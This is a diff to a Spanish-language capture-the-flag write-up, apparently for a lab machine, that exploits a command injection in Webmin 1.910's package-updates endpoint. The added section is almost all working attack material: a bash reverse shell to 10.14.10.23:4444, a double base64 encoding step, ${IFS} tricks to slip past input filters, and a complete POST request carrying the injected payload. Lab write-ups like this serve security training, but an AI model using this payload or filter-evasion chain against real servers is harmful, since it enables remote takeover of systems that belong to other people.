@@ -62,4 +62,47 @@ Desde el escaneo del principio sabemos la version de webmin, 1.910 esta version 
 ```
 u=acl%2Fapt&u=$(COMANDO A EJECUTAR)
 ```
-Con esto podemos conseguir obtener una reverse shell, si pasamos los filtros :v
+Con esto podemos conseguir obtener una reverse shell, si pasamos los filtros ya que "/" , "," y " ", hacen que el sistema trunque el input, para solucionar este probelma recurriremos a dos truquitos, la variable IFS y encodear el payload en base64, procedamos
+
+* 1. Escribimos la reverse shell en plano
+```
+bash -i >& /dev/tcp/10.14.10.23/4444 0>&1
+```
+* 2. La encodeamos en base 64, en mi caso quedaba un + en el payload lo cual da problemas con el URL encoding asi que la doble encodee en base64:
+```
+echo "bash -i >& /dev/tcp/10.14.10.23/4444 0>&1" | base64 | base64
+```
+* 3. Construimos la secuencia de comandos para decodificar el payload y ejecutarlo en la máquina remota
+```
+echo WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhOQzR4TUM0eU15ODBORFEwSURBK0pqRUsK | base64 -d | base64 -d | bash
+```
+* 4. Eliminamos los espacios no necesarios para la ejecución del comando
+```
+echo WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhOQzR4TUM0eU15ODBORFEwSURBK0pqRUsK|base64 -d|base64 -d|bash
+```
+* 5. Añadimos IFS donde aún tengamos espacios en blanco
+```
+echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhOQzR4TUM0eU15ODBORFEwSURBK0pqRUsK|base64${IFS}-d|base64${IFS}-d|bash```
+```
+Con esto ya tendriamos nuestra request completa
+```
+POST /package-updates/update.cgi HTTP/1.1
+Host: 10.10.10.160:10000
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: */*
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Progressive-URL: https://10.10.10.160:10000/package-updates/update.cgi
+X-Requested-From: package-updates
+X-Requested-From-Tab: webmin
+X-Requested-With: XMLHttpRequest
+Content-Length: 134
+Origin: https://10.10.10.160:10000
+Connection: close
+Referer: https://10.10.10.160:10000/package-updates/update.cgi?xnavigation=1
+Cookie: redirect=1; testing=1; sid=5f376f95923e8a275a21fe3ef86fc671
+
+u=acl%2Fapt&u=$(echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhOQzR4TUM0eU15ODBORFEwSURBK0pqRUsK|base64${IFS}-d|base64${IFS}-d|bash)
+```
+La ponemos en nuestro repeater , abrimos el listener en local y lanzamos la request
